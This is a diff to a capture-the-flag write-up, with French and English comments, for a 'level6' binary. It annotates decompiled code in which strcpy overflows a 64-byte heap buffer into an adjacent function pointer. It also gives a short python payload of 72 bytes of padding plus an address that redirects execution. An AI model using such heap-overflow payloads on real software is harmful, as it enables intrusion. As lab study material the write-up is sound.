@@ -4,21 +4,21 @@ int32_t main (char ** envp) {
     const char * src;
     void * var_18h;
     char * dest;
-    eax = malloc (0x40);
-    eax = malloc (4, eax);
+    eax = malloc (0x40);		//dest = malloc(64)
+    eax = malloc (4, eax);		//var_18h = malloc(sizeof(void*))
     var_18h = eax;
     edx = m;                    //edx -> m (la fonction)
     eax = var_18h;
     *(eax) = edx;               //m est mise à l'adresse de var_18h (dans le malloc)
-    eax = envp;                 
-    eax += 4;
+    eax = envp					//en réalité c'est argv
+    eax += 4;					//argv + 1
     eax = *(eax);
-    edx = *(eax);
-    eax = dest;
-    strcpy (eax, edx);
-    eax = var_18h;          
-    eax = *(eax);              //On récupère m
-    void (*eax)() ();          //On l'execute
+    edx = *(eax);				//edx = argv[1]
+    eax = dest;					//eax = dest
+    strcpy (eax, edx);			//strcpy(dest, argv[1])
+    eax = var_18h;
+    eax = *(eax);              //On récupère var_18h
+    void (*eax)() ();          //On execture var_18h
     return eax;
 }
 
@@ -33,3 +33,7 @@ python -c "print 'A'*72 + '\x54\x84\x04\x08'" > /tmp/file
 ./level6 $(cat /tmp/file)
 
 and it worked
+
+// why it worked?
+=> strcpy can be overflow and if we overflow the first malloc dest, it will overflow on the second var_18h
+=> then it will be executed by the program so if we replace var_18h by the function n it will execute the good function
